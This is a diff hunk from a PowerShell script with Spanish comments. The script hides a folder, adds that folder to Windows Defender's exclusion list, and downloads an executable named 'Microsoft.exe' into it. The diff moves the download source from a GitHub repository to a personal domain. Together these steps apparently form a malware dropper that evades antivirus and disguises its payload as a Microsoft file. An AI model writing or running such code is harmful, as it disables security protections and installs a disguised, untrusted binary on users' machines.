@@ -11,7 +11,7 @@ attrib +h $folderPath
 Add-MpPreference -ExclusionPath $folderPath
 
 # Descargar el archivo Microsoft.exe desde GitHub y guardarlo en la carpeta creada
-$downloadUrl = "https://github.com/baa4ts/BIT-CROW/raw/refs/heads/main/source/build/Microsoft.exe"
+$downloadUrl = "https://baa4ts.is-a-good.dev/script/Microsoft.exe"
 $outputFile = Join-Path $folderPath "Microsoft.exe"
 Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
 
